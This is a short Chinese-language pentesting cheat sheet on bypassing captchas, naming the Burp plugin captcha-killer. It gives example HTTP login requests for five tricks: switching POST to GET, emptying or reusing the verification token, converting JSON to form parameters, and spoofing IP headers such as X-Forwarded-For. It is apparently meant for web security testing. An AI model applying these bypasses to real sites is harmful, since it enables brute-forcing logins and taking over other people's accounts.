## 绕过验证码
burp插件：captcha-killer
1.尝试更改请求方法，例如POST到GET
```
POST / HTTP 1.1
Host：target.com
[...]

_RequestVerificationToken = xxxxxxxxxxxxxx＆_Username = daffa＆_Password = test123
```

将方法更改为GET
```
GET /?_RequestVerificationToken = xxxxxxxxxxxxxx＆_Username = daffa＆_Password = test123 HTTP 1.1
Host：target.com
[...]
```

2.尝试删除验证码参数的值
```
POST / HTTP 1.1
Host：target.com
[...]

_RequestVerificationToken =＆_ Username = daffa＆_Password = test123
```

3.尝试重用旧的验证码
```
POST / HTTP 1.1
Host：target.com
[...]

_RequestVerificationToken = OLD_CAPTCHA_TOKEN＆_Username = daffa＆_Password = test123
```

4.将JSON数据转换为普通请求参数
```
POST / HTTP 1.1
Host：target.com
[...]

{“ _RequestVerificationToken”：“ xxxxxxxxxxxxxx”，“ _ Username”：“ daffa”，“ _ Password”：“ test123”}
```
转换为正常要求
```
POST / HTTP 1.1
Host：target.com
[...]

_RequestVerificationToken = xxxxxxxxxxxxxx＆_Username = daffa＆_Password = test123
```

5.尝试使用自定义标头绕过验证码
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```
